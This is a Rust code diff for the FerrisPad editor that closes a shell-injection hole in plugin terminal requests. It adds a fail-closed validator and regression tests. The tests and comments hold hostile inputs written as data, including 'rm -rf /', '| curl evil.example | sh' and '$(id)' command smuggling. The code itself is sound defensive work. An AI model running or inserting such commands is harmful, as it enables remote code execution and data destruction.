@@ -7,7 +7,7 @@ use fltk::app::Sender;
 use crate::app::controllers::tabs::TabManager;
 use crate::app::controllers::view::ViewController;
 use crate::app::domain::messages::Message;
-use crate::app::plugins::{HookResult, WidgetManager};
+use crate::app::plugins::{HookResult, TerminalViewRequest, WidgetManager};
 
 /// Bundles the mutable references needed by hook/lint result processing.
 pub struct HookContext<'a> {
@@ -177,43 +177,17 @@ pub fn process_widget_requests(
     if let Some(ref terminal_request) = result.terminal_view
         && terminal_request.is_valid()
     {
-        // Security: block command=None (raw shell access)
-        let Some(ref cmd) = terminal_request.command else {
+        // Every field of a plugin terminal_view request is untrusted. Fail
+        // closed on anything that isn't an approved, metacharacter-free
+        // command with metacharacter-free args and working_dir.
+        if let Err(reason) = validate_terminal_request(terminal_request, approved_commands) {
             eprintln!(
-                "[plugin:security] '{}' tried to open default shell terminal — blocked",
-                effective_name
-            );
-            return;
-        };
-
-        // Security: validate command name for shell metacharacters
-        if crate::app::plugins::security::validate_command_arg(cmd).is_err() {
-            eprintln!(
-                "[plugin:security] terminal command '{}' blocked: invalid characters",
-                cmd
-            );
-            return;
-        }
-
-        // Security: check command against plugin's approved_commands
-        let cmd_basename = std::path::Path::new(cmd.as_str())
-            .file_name()
-            .and_then(|n| n.to_str())
-            .unwrap_or(cmd);
-        if !approved_commands
-            .iter()
-            .any(|c| c == cmd_basename || c == cmd.as_str())
-        {
-            eprintln!(
-                "[plugin:security] '{}' terminal command '{}' not approved",
-                effective_name, cmd_basename
+                "[plugin:security] '{}' terminal_view blocked: {}",
+                effective_name, reason
             );
             sender.send(Message::ToastShow(
                 crate::ui::toast::ToastLevel::Error,
-                format!(
-                    "Plugin '{}': terminal command '{}' not approved",
-                    effective_name, cmd_basename
-                ),
+                format!("Plugin '{}': terminal blocked ({})", effective_name, reason),
             ));
             return;
         }
@@ -229,5 +203,122 @@ pub fn process_widget_requests(
             plugin_name: effective_name.to_string(),
             request: terminal_request.clone(),
         });
+    }
+}
+
+/// Fail-closed security gate for a plugin-issued `terminal_view` request.
+///
+/// Returns `Ok(())` only when the command is on the plugin's user-approved
+/// list and neither the command, its arguments, nor an explicit working
+/// directory contain shell metacharacters. Every rejection carries a
+/// human-readable reason.
+///
+/// Plugin input is untrusted: this is the gate that stops a plugin granted one
+/// benign command (e.g. `git`) from smuggling `git status; curl x | sh` in
+/// through unchecked `args`.
+fn validate_terminal_request(
+    request: &TerminalViewRequest,
+    approved_commands: &[String],
+) -> Result<(), String> {
+    use crate::app::plugins::security::validate_command_arg;
+
+    // Raw shell access (command = None) is never allowed for plugins.
+    let Some(cmd) = request.command.as_deref() else {
+        return Err("default shell terminal is not allowed for plugins".to_string());
+    };
+
+    // The command name must be free of shell metacharacters...
+    validate_command_arg(cmd).map_err(|e| format!("command '{}' rejected: {}", cmd, e))?;
+
+    // ...and on the plugin's user-approved list (compared by basename so
+    // "/path/to/venv/bin/ruff" still matches an approved "ruff").
+    let cmd_basename = std::path::Path::new(cmd)
+        .file_name()
+        .and_then(|n| n.to_str())
+        .unwrap_or(cmd);
+    if !approved_commands
+        .iter()
+        .any(|c| c == cmd_basename || c == cmd)
+    {
+        return Err(format!("command '{}' not approved", cmd_basename));
+    }
+
+    // Every argument is untrusted and must clear the same metacharacter gate.
+    // This is the hole that allowed shell injection through an approved command.
+    for arg in &request.args {
+        validate_command_arg(arg).map_err(|e| format!("argument '{}' rejected: {}", arg, e))?;
+    }
+
+    // A plugin-supplied working directory must also be metacharacter-free. When
+    // the plugin leaves it unset, FerrisPad fills in the discovered project root
+    // later — that trusted path is not subject to this check.
+    if let Some(dir) = request.working_dir.as_deref() {
+        validate_command_arg(dir).map_err(|e| format!("working_dir '{}' rejected: {}", dir, e))?;
+    }
+
+    Ok(())
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    fn req(command: Option<&str>, args: &[&str], working_dir: Option<&str>) -> TerminalViewRequest {
+        TerminalViewRequest {
+            title: "t".to_string(),
+            command: command.map(str::to_string),
+            args: args.iter().map(|s| s.to_string()).collect(),
+            working_dir: working_dir.map(str::to_string),
+            persistent: false,
+        }
+    }
+
+    #[test]
+    fn approved_clean_command_is_allowed() {
+        let request = req(Some("git"), &["status"], None);
+        assert!(validate_terminal_request(&request, &["git".to_string()]).is_ok());
+    }
+
+    #[test]
+    fn unapproved_command_is_rejected() {
+        let request = req(Some("rm"), &["-rf", "/"], None);
+        assert!(validate_terminal_request(&request, &["git".to_string()]).is_err());
+    }
+
+    #[test]
+    fn default_shell_command_none_is_rejected() {
+        let request = req(None, &[], None);
+        assert!(validate_terminal_request(&request, &["git".to_string()]).is_err());
+    }
+
+    #[test]
+    fn metacharacters_in_command_name_are_rejected() {
+        let request = req(Some("git; id"), &[], None);
+        assert!(validate_terminal_request(&request, &["git".to_string()]).is_err());
+    }
+
+    // Regression (T0001, audit S3): a plugin granted the single approved command
+    // `git` must NOT be able to smuggle shell code through an argument. Before
+    // the fix `args` were passed through unchecked and `pty.rs` ran them via
+    // `$SHELL -lc "<git status; touch pwned>"` — full RCE.
+    #[test]
+    fn shell_injection_in_args_is_rejected() {
+        let request = req(Some("git"), &["status; touch /tmp/ferrispad_pwned"], None);
+        assert!(
+            validate_terminal_request(&request, &["git".to_string()]).is_err(),
+            "injected shell metacharacters in args must be rejected"
+        );
+    }
+
+    #[test]
+    fn pipe_injection_in_args_is_rejected() {
+        let request = req(Some("git"), &["log", "| curl evil.example | sh"], None);
+        assert!(validate_terminal_request(&request, &["git".to_string()]).is_err());
+    }
+
+    #[test]
+    fn shell_injection_in_working_dir_is_rejected() {
+        let request = req(Some("git"), &["status"], Some("/tmp/$(id)"));
+        assert!(validate_terminal_request(&request, &["git".to_string()]).is_err());
     }
 }
